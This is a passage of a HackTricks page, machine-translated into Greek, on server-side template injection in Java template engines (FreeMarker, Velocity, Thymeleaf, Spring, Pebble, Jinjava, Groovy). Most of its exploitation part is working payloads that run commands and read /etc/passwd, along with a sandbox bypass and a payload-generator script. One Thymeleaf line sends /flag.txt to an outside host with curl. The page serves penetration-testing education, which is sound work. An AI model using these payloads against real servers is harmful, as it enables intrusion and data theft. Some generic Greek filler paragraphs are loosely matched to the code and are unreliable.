# SSTI (Server Side Template Injection)

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (3).png" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com) είναι το πιο σχετικό συνέδριο κυβερνοασφάλειας στην **Ισπανία** και ένα από τα πιο σημαντικά στην **Ευρώπη**. Με **αποστολή την προώθηση της τεχνικής γνώσης**, αυτό το συνέδριο είναι ένας ζωηρός σημείο συνάντησης για επαγγελματίες τεχνολογίας και κυβερνοασφάλειας σε κάθε ειδικότητα.

{% embed url="https://www.rootedcon.com/" %}

## Τι είναι SSTI (Server-Side Template Injection)

Η ενσωμάτωση προτύπων στην πλευρά του διακομιστή (Server-side template injection) είναι μια ευπάθεια που συμβαίνει όταν ένας επιτιθέμενος μπορεί να εισαγάγει κακόβουλο κώδικα σε ένα πρότυπο που εκτελείται στο διακομιστή. Αυτή η ευπάθεια μπορεί να βρεθεί σε διάφορες τεχνολογίες, συμπεριλαμβανομένης της Jinja.

Η Jinja είναι μια δημοφιλής μηχανή προτύπων που χρησιμοποιείται σε εφαρμογές ιστού. Ας θεωρήσουμε ένα παράδειγμα που δείχνει ένα ευπαθές απόσπασμα κώδικα που χρησιμοποιεί τη Jinja:
```python
output = template.render(name=request.args.get('name'))
```
Σε αυτόν τον ευάλωτο κώδικα, η παράμετρος `name` από το αίτημα του χρήστη περνιέται απευθείας στο πρότυπο χρησιμοποιώντας τη συνάρτηση `render`. Αυτό μπορεί θεωρητικά να επιτρέψει σε έναν επιτιθέμενο να εισάγει κακόβουλο κώδικα στην παράμετρο `name`, οδηγώντας σε ενσωμάτωση προτύπου στην πλευρά του διακομιστή.

Για παράδειγμα, ένας επιτιθέμενος θα μπορούσε να δημιουργήσει ένα αίτημα με ένα φορτίο όπως αυτό:
```
http://vulnerable-website.com/?name={{bad-stuff-here}}
```
Το payload `{{κακό-περιεχόμενο-εδώ}}` εισάγεται στην παράμετρο `name`. Αυτό το payload μπορεί να περιέχει κατευθύνσεις Jinja template που επιτρέπουν στον επιτιθέμενο να εκτελέσει μη εξουσιοδοτημένο κώδικα ή να χειριστεί τη μηχανή προτύπου, αποκτώντας έτσι έλεγχο πάνω στον διακομιστή.

Για να αποτραπούν οι ευπάθειες της ενσωμάτωσης προτύπων στην πλευρά του διακομιστή, οι προγραμματιστές πρέπει να διασφαλίσουν ότι η είσοδος του χρήστη απολυμαίνεται και επικυρώνεται σωστά πριν εισαχθεί στα πρότυπα. Η εφαρμογή της επικύρωσης της εισόδου και η χρήση τεχνικών απόδρασης που λαμβάνουν υπόψη το περιβάλλον μπορούν να βοηθήσουν στη μείωση του κινδύνου αυτής της ευπάθειας.

### Ανίχνευση
Για να ανιχνευθεί η ενσωμάτωση προτύπων στην πλευρά του διακομιστή (SSTI), αρχικά, η **δοκιμή του προτύπου** είναι μια απλή προσέγγιση. Αυτό περιλαμβάνει την εισαγωγή μιας ακολουθίας ειδικών χαρακτήρων (**`${{<%[%'"}}%\`**) στο πρότυπο και την ανάλυση των διαφορών στην απόκριση του διακομιστή σε κανονικά δεδομένα έναντι αυτού του ειδικού φορτίου. Οι ένδειξης ευπαθειών περιλαμβάνουν:
- Εμφάνιση σφαλμάτων που αποκαλύπτουν την ευπάθεια και πιθανώς τη μηχανή προτύπου.
- Απουσία του φορτίου στην αντανάκλαση, ή μέρη του που λείπουν, υποδηλώνοντας ότι ο διακομιστής το επεξεργάζεται διαφορετικά από τα κανονικά δεδομένα.

- **Κείμενο πλαίσιο**: Διακρίνεται από το XSS ελέγχοντας εάν ο διακομιστής αξιολογεί τις προτυποποιημένες εκφράσεις (π.χ. `{{7*7}}`, `${7*7}`).

- **Πλαίσιο κώδικα**: Επιβεβαιώστε την ευπάθεια αλλάζοντας τις παραμέτρους εισόδου. Για παράδειγμα, αλλάξτε το `greeting` στο `http://vulnerable-website.com/?greeting=data.username` για να δείτε εάν η έξοδος του διακομιστή είναι δυναμική ή σταθερή, όπως στο `greeting=data.username}}hello` που επιστρέφει το όνομα χρήστη.

#### Φάση Αναγνώρισης
Η αναγνώριση της μηχανής προτύπου περιλαμβάνει την ανάλυση μηνυμάτων σφάλματος ή τη δοκιμή χειροκίνητων διαφόρων φορτίων που είναι συγκεκριμένα για τη γλώσσα. Συνηθισμένα φορτία που προκαλούν σφάλματα περιλαμβάνουν `${7/0}`, `{{7/0}}` και `<%= 7/0 %>`. Η παρατήρηση της απόκρισης του διακομιστή σε μαθηματικές πράξεις βοηθά στον εντοπισμό της συγκεκριμένης μηχανής προτύπου.

## Εργαλεία

### [TInjA](https://github.com/Hackmanit/TInjA)

ένα αποτελεσματικό εργαλείο ανίχνευσης SSTI + CSTI που χρησιμοποιεί νέα πολυγλωττικά
```bash
tinja url -u "http://example.com/?name=Kirlia" -H "Authentication: Bearer ey..."
tinja url -u "http://example.com/" -d "username=Kirlia"  -c "PHPSESSID=ABC123..."
```
### [SSTImap](https://github.com/vladko312/sstimap)

Το SSTImap είναι ένα εργαλείο που χρησιμοποιείται για την ανίχνευση και εκμετάλλευση ευπάθειας SSTI (Server-Side Template Injection) σε εφαρμογές ιστού. Αυτή η ευπάθεια συμβαίνει όταν ο εξυπηρετητής εκτελεί κώδικα προτύπου στην πλευρά του διακομιστή, επιτρέποντας σε επιτιθέμενους να εκτελέσουν κακόβουλο κώδικα.

Το SSTImap εκμεταλλεύεται αυτήν την ευπάθεια εκτελώντας δοκιμές εντολών σε διάφορα πρότυπα, όπως το Jinja2, το Freemarker και το Velocity. Με αυτόν τον τρόπο, μπορεί να εντοπίσει ευπάθειες SSTI και να παρέχει πληροφορίες για το πώς να εκμεταλλευτείτε αυτές τις ευπάθειες.

Το SSTImap είναι ένα ισχυρό εργαλείο για την ανίχνευση και εκμετάλλευση ευπάθειας SSTI σε εφαρμογές ιστού. Χρησιμοποιήστε το με προσοχή και μόνο για νόμιμους σκοπούς.
```bash
python3 sstimap.py -i -l 5
python3 sstimap.py -u "http://example.com/ --crawl 5 --forms
python3 sstimap.py -u 'https://example.com/page?name=John' -s
```
### [Tplmap](https://github.com/epinna/tplmap)

Tplmap είναι ένα εργαλείο που χρησιμοποιείται για εκμετάλλευση ευπάθειας στην ενσωματωμένη αξιολόγηση προτύπων (SSTI) στον εξυπηρετητή. Το εργαλείο αυτό μπορεί να χρησιμοποιηθεί για να εντοπίσει και να εκμεταλλευτεί ευπάθειες SSTI σε διάφορες γλώσσες προγραμματισμού, όπως Python, Ruby, PHP και άλλες.

Το Tplmap είναι ένα ισχυρό εργαλείο που μπορεί να ανιχνεύσει ευπάθειες SSTI σε διάφορες πλατφόρμες, όπως πλατφόρμες περιβάλλοντος εργασίας, όπως το Flask, το Django και το Jinja2. Μπορεί επίσης να χρησιμοποιηθεί για να εκμεταλλευτεί αυτές τις ευπάθειες και να ανακτήσει ευαίσθητες πληροφορίες από τον εξυπηρετητή.

Για να χρησιμοποιήσετε το Tplmap, απλά εκτελέστε την εντολή `tplmap` ακολουθούμενη από τις απαραίτητες παραμέτρους, όπως η διεύθυνση URL του εξυπηρετητή και ο τύπος της ευπάθειας SSTI που θέλετε να εκμεταλλευτείτε. Το Tplmap θα εκτελέσει αυτόματα τις απαραίτητες επιθέσεις και θα επιστρέψει τα αποτελέσματα.

Το Tplmap είναι ένα εξαιρετικά χρήσιμο εργαλείο για τους επαγγελματίες χάκερ και τους ερευνητές ασφαλείας που επιθυμούν να εκμεταλλευτούν ευπάθειες SSTI σε εφαρμογές ιστού. Με τη βοήθεια του Tplmap, μπορείτε να ανακαλύψετε ευπάθειες SSTI και να αποκτήσετε πρόσβαση σε ευαίσθητες πληροφορίες από τον εξυπηρετητή.
```python
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```
### [Πίνακας Εισαγωγής Προτύπου](https://github.com/Hackmanit/template-injection-table)

ένας διαδραστικός πίνακας που περιέχει τα πιο αποδοτικά πολυγλώττα εισαγωγής προτύπου μαζί με τις αναμενόμενες απαντήσεις των 44 πιο σημαντικών μηχανών προτύπου.

## Εκμετάλλευση

### Γενική

Σε αυτήν τη **λίστα λέξεων** μπορείτε να βρείτε **μεταβλητές που έχουν καθοριστεί** στα περιβάλλοντα ορισμένων από τις παρακάτω μηχανές:

* [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt)
* [https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt)

### Java

**Java - Βασική εισαγωγή**
```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
// if ${...} doesn't work try #{...}, *{...}, @{...} or ~{...}.
```
**Java - Ανάκτηση των μεταβλητών περιβάλλοντος του συστήματος**

Για να ανακτήσετε τις μεταβλητές περιβάλλοντος του συστήματος σε Java, μπορείτε να χρησιμοποιήσετε την κλάση `System` και τη μέθοδο `getenv()`. Αυτή η μέθοδος επιστρέφει ένα `Map` που περιέχει όλες τις μεταβλητές περιβάλλοντος του συστήματος και τις αντίστοιχες τιμές τους.

Παρακάτω παρουσιάζεται ένα παράδειγμα κώδικα που δείχνει πώς να ανακτήσετε τις μεταβλητές περιβάλλοντος του συστήματος:

```java
import java.util.Map;

public class EnvironmentVariables {
    public static void main(String[] args) {
        Map<String, String> env = System.getenv();
        for (String key : env.keySet()) {
            String value = env.get(key);
            System.out.println(key + " = " + value);
        }
    }
}
```

Αυτός ο κώδικας θα εκτυπώσει όλες τις μεταβλητές περιβάλλοντος του συστήματος και τις αντίστοιχες τιμές τους στην κονσόλα. Μπορείτε να τροποποιήσετε τον κώδικα ανάλογα με τις ανάγκες σας για να εκτελέσετε περαιτέρω επεξεργασία ή ανάλυση των μεταβλητών περιβάλλοντος.
```java
${T(java.lang.System).getenv()}
```
**Java - Ανάκτηση του αρχείου /etc/passwd**

Η εκμετάλλευση της ευπάθειας Server-Side Template Injection (SSTI) μπορεί να οδηγήσει στην ανάκτηση του αρχείου /etc/passwd σε έναν διακομιστή που εκτελεί την Java πλατφόρμα.

Για να επιτευχθεί αυτό, μπορούμε να χρησιμοποιήσουμε την ευπάθεια του SSTI για να εισαγάγουμε κώδικα Java στο πρότυπο. Ο κώδικας Java μπορεί να εκτελέσει την εντολή `cat /etc/passwd` για να ανακτήσει το περιεχόμενο του αρχείου /etc/passwd.

Παρακάτω παρουσιάζεται ένα παράδειγμα κώδικα Java που μπορεί να χρησιμοποιηθεί για να ανακτήσει το περιεχόμενο του αρχείου /etc/passwd:

```java
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class CommandExecution {
    public static void main(String[] args) {
        try {
            String command = "cat /etc/passwd";
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
            reader.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

Με τη χρήση της ευπάθειας SSTI, μπορούμε να εισαγάγουμε τον παραπάνω κώδικα Java σε ένα πρότυπο και να το εκτελέσουμε στον διακομιστή. Αυτό θα οδηγήσει στην ανάκτηση και εμφάνιση του περιεχομένου του αρχείου /etc/passwd.
```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
### FreeMarker (Java)

Μπορείτε να δοκιμάσετε τις επιθέσεις σας στη διεύθυνση [https://try.freemarker.apache.org](https://try.freemarker.apache.org)

* `{{7*7}} = {{7*7}}`
* `${7*7} = 49`
* `#{7*7} = 49 -- (legacy)`
* `${7*'7'} Τίποτα`
* `${foobar}`
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```
**Freemarker - Παράκαμψη αμμοδοχείου**

⚠️ λειτουργεί μόνο σε εκδόσεις του Freemarker κάτω από την 2.3.30
```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```
**Περισσότερες πληροφορίες**

* Στην ενότητα FreeMarker του [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker)

### Velocity (Java)
```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```
**Περισσότερες πληροφορίες**

* Στην ενότητα Velocity του [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity)

### Thymeleaf

Στο Thymeleaf, ένα κοινό τεστ για ευπάθειες SSTI είναι η έκφραση `${7*7}`, η οποία ισχύει και για αυτόν τον μηχανισμό προτύπου. Για πιθανή εκτέλεση απομακρυσμένου κώδικα, μπορούν να χρησιμοποιηθούν εκφράσεις όπως οι παρακάτω:

- SpringEL:
```java
${T(java.lang.Runtime).getRuntime().exec('calc')}
```
- OGNL:
```java
${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}
```

Το Thymeleaf απαιτεί αυτές οι εκφράσεις να τοποθετούνται εντός συγκεκριμένων χαρακτηριστικών. Ωστόσο, υποστηρίζεται και η _ενσωμάτωση εκφράσεων_ για άλλες τοποθεσίες προτύπων, χρησιμοποιώντας σύνταξη όπως `[[...]]` ή `[(...)]`. Έτσι, ένα απλό φορτίο δοκιμής SSTI μπορεί να μοιάζει με `[[${7*7}]]`.

Ωστόσο, η πιθανότητα αυτού του φορτίου να λειτουργήσει είναι γενικά χαμηλή. Η προεπιλεγμένη διαμόρφωση του Thymeleaf δεν υποστηρίζει δυναμική δημιουργία προτύπων. Οι πρότυποι πρέπει να έχουν καθοριστεί εκ των προτέρων. Οι προγραμματιστές θα χρειαστεί να υλοποιήσουν τον δικό τους `TemplateResolver` για να δημιουργήσουν πρότυπα από συμβολοσειρές κατά τη διάρκεια της εκτέλεσης, κάτι που είναι ασυνήθιστο.

Το Thymeleaf προσφέρει επίσης _προεπεξεργασία εκφράσεων_, όπου οι εκφράσεις μέσα σε διπλά κάτω παύλες (`__...__`) προεπεξεργάζονται. Αυτή η δυνατότητα μπορεί να χρησιμοποιηθεί στην κατασκευή εκφράσεων, όπως φαίνεται στην τεκμηρίωση του Thymeleaf:
```java
#{selection.__${sel.code}__}
```
**Παράδειγμα ευπάθειας στο Thymeleaf**

Λάβετε υπόψη τον παρακάτω κώδικα, ο οποίος μπορεί να είναι ευάλωτος σε εκμετάλλευση:
```xml
<a th:href="@{__${path}__}" th:title="${title}">
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>
```
Αυτό υποδηλώνει ότι εάν ο μηχανισμός προτύπου επεξεργαστεί αυτές τις εισόδους εσφαλμένα, μπορεί να οδηγήσει σε εκτέλεση απομακρυσμένου κώδικα με πρόσβαση σε διευθύνσεις URL όπως:
```
http://localhost:8082/(7*7)
http://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')})
```
**Περισσότερες πληροφορίες**

* [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Πλαίσιο Spring (Java)
```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```
**Παράκαμψη φίλτρων**

Μπορούν να χρησιμοποιηθούν πολλαπλές μεταβλητές εκφράσεις, αν το `${...}` δεν λειτουργεί δοκιμάστε `#{...}`, `*{...}`, `@{...}` ή `~{...}`.

* Διαβάστε το `/etc/passwd`
```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
* Προσαρμοσμένο σενάριο για τη δημιουργία φορτίου
```python
#!/usr/bin/python3

## Written By Zeyad Abulaban (zAbuQasem)
# Usage: python3 gen.py "id"

from sys import argv

cmd = list(argv[1].strip())
print("Payload: ", cmd , end="\n\n")
converted = [ord(c) for c in cmd]
base_payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec'
end_payload = '.getInputStream())}'

count = 1
for i in converted:
if count == 1:
base_payload += f"(T(java.lang.Character).toString({i}).concat"
count += 1
elif count == len(converted):
base_payload += f"(T(java.lang.Character).toString({i})))"
else:
base_payload += f"(T(java.lang.Character).toString({i})).concat"
count += 1

print(base_payload + end_payload)
```
**Περισσότερες Πληροφορίες**

* [Thymleaf SSTI](https://javamana.com/2021/11/20211121071046977B.html)
* [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---retrieve-etcpasswd)

### Παραπλάνηση Προβολής Spring (Java)
```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```
* [https://github.com/veracode-research/spring-view-manipulation](https://github.com/veracode-research/spring-view-manipulation)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Pebble (Java)

* `{{ someString.toUPPERCASE() }}`

Παλιά έκδοση του Pebble ( < έκδοση 3.0.9):
```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
```
Νέα έκδοση του Pebble:
```java
{% raw %}
{% set cmd = 'id' %}
{% endraw %}


{% set bytes = (1).TYPE
.forName('java.lang.Runtime')
.methods[6]
.invoke(null,null)
.exec(cmd)
.inputStream
.readAllBytes() %}
{{ (1).TYPE
.forName('java.lang.String')
.constructors[0]
.newInstance(([bytes]).toArray()) }}
```
### Jinjava (Java)

Το Jinjava είναι ένα template engine για τη γλώσσα προγραμματισμού Java. Χρησιμοποιείται για τη δημιουργία και την απεικόνιση δυναμικών προτύπων στην εφαρμογή σας. Ωστόσο, η χρήση του Jinjava μπορεί να οδηγήσει σε ευπάθειες ασφαλείας, όπως η Server-Side Template Injection (SSTI).

Η SSTI είναι μια ευπάθεια που επιτρέπει σε επιτιθέμενους να εκτελέσουν κώδικα στον διακομιστή σας μέσω των προτύπων που χρησιμοποιείτε. Αυτό μπορεί να οδηγήσει σε αποκάλυψη ευαίσθητων πληροφοριών, εκτέλεση ανεπιθύμητων εντολών ή ακόμη και πλήρη παραβίαση του διακομιστή σας.

Για να εκμεταλλευτείτε μια ευπάθεια SSTI με το Jinjava, πρέπει να εισάγετε κώδικα Java στο πρότυπο που χρησιμοποιείται από την εφαρμογή σας. Αυτό μπορεί να γίνει μέσω εισαγωγής μεταβλητών, κλήσης μεθόδων ή ακόμη και εκτέλεσης εντολών Java.

Για να προστατευτείτε από επιθέσεις SSTI με το Jinjava, πρέπει να ελέγξετε και να φιλτράρετε την είσοδο των χρηστών που χρησιμοποιείται στα πρότυπα. Επίσης, πρέπει να περιορίσετε τις δυνατότητες εκτέλεσης κώδικα του Jinjava, απενεργοποιώντας ορισμένες λειτουργίες ή περιορίζοντας την πρόσβαση σε ευαίσθητες κλάσεις και μεθόδους.

Είναι σημαντικό να είστε προσεκτικοί κατά τη χρήση του Jinjava και να εφαρμόζετε τις απαραίτητες προφυλάξεις για να αποτρέψετε επιθέσεις SSTI και την παραβίαση της ασφάλειας της εφαρμογής σας.
```java
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```
Το Jinjava είναι ένα ανοιχτού κώδικα έργο που αναπτύχθηκε από την Hubspot και είναι διαθέσιμο στο [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)

**Jinjava - Εκτέλεση εντολών**

Διορθώθηκε από το [https://github.com/HubSpot/jinjava/pull/230](https://github.com/HubSpot/jinjava/pull/230)
```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```
**Περισσότερες πληροφορίες**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava)

### Hubspot - HuBL (Java)

* `{% %}` διαχωριστές δηλώσεων
* `{{ }}` διαχωριστές εκφράσεων
* `{# #}` διαχωριστές σχολίων
* `{{ request }}` - com.hubspot.content.hubl.context.TemplateContextRequest@23548206
* `{{'a'.toUpperCase()}}` - "A"
* `{{'a'.concat('b')}}` - "ab"
* `{{'a'.getClass()}}` - java.lang.String
* `{{request.getClass()}}` - class com.hubspot.content.hubl.context.TemplateContextRequest
* `{{request.getClass().getDeclaredMethods()[0]}}` - public boolean com.hubspot.content.hubl.context.TemplateContextRequest.isDebug()

Αναζήτηση για "com.hubspot.content.hubl.context.TemplateContextRequest" και ανακάλυψη του [Jinjava project στο Github](https://github.com/HubSpot/jinjava/).
```java
{{request.isDebug()}}
//output: False

//Using string 'a' to get an instance of class sun.misc.Launcher
{{'a'.getClass().forName('sun.misc.Launcher').newInstance()}}
//output: sun.misc.Launcher@715537d4

//It is also possible to get a new object of the Jinjava class
{{'a'.getClass().forName('com.hubspot.jinjava.JinjavaConfig').newInstance()}}
//output: com.hubspot.jinjava.JinjavaConfig@78a56797

//It was also possible to call methods on the created object by combining the



{% raw %}
{% %} and {{ }} blocks
{% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %}
{% endraw %}


{{ji.render('{{1*2}}')}}
//Here, I created a variable 'ji' with new instance of com.hubspot.jinjava.Jinjava class and obtained reference to the newInterpreter method. In the next block, I called the render method on 'ji' with expression {{1*2}}.

//{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
//output: xxx

//RCE
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
//output: java.lang.UNIXProcess@1e5f456e

//RCE with org.apache.commons.io.IOUtils.
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//output: netstat execution

//Multiple arguments to the commands
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//Output: Linux bumpy-puma 4.9.62-hs4.el6.x86_64 #1 SMP Fri Jun 1 03:00:47 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
**Περισσότερες πληροφορίες**

* [https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)

### Έκφραση Γλώσσας - EL (Java)

* `${"aaaa"}` - "aaaa"
* `${99999+1}` - 100000.
* `#{7*7}` - 49
* `${{7*7}}` - 49
* `${{request}}, ${{session}}, {{faceContext}}`

Η Έκφραση Γλώσσας (EL) είναι μια βασική λειτουργία που διευκολύνει την αλληλεπίδραση μεταξύ του επιπέδου παρουσίασης (όπως ιστοσελίδες) και της λογικής εφαρμογής (όπως διαχειριζόμενα αντικείμενα) στο JavaEE. Χρησιμοποιείται εκτενώς σε πολλές τεχνολογίες JavaEE για να διευκολύνει αυτήν την επικοινωνία. Οι βασικές τεχνολογίες JavaEE που χρησιμοποιούν την EL περιλαμβάνουν:

- **JavaServer Faces (JSF)**: Χρησιμοποιεί την EL για να συνδέει τα στοιχεία στις σελίδες JSF με τα αντίστοιχα δεδομένα και ενέργειες στο πίσω μέρος.
- **JavaServer Pages (JSP)**: Η EL χρησιμοποιείται στο JSP για την πρόσβαση και την επεξεργασία δεδομένων μέσα στις σελίδες JSP, καθιστώντας πιο εύκολη τη σύνδεση των στοιχείων της σελίδας με τα δεδομένα της εφαρμογής.
- **Contexts and Dependency Injection for Java EE (CDI)**: Η EL ενσωματώνεται με το CDI για να επιτρέπει την άριστη αλληλεπίδραση μεταξύ του επιπέδου ιστού και των διαχειριζόμενων αντικειμένων, εξασφαλίζοντας μια πιο συνεκτική δομή εφαρμογής.

Ελέγξτε την ακόλουθη σελίδα για να μάθετε περισσότερα σχετικά με την **εκμετάλλευση των διερμηνέων EL**:

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Groovy (Java)

Οι παρακάτω παρακάμψεις του Διαχειριστή Ασφαλείας προήλθαν από αυτήν την [**ανάλυση**](https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/).
```java
//Basic Payload
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
